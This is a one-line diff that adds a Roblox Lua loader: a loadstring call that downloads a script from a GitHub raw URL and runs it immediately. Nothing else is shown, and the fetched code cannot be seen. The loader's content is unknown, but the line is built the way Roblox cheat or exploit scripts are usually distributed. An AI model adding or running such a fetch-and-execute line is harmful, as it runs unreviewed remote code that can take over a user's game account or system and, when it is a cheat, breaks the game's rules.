@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LocalAstraCat/BB-Fresh-Bakery/main/main"))()
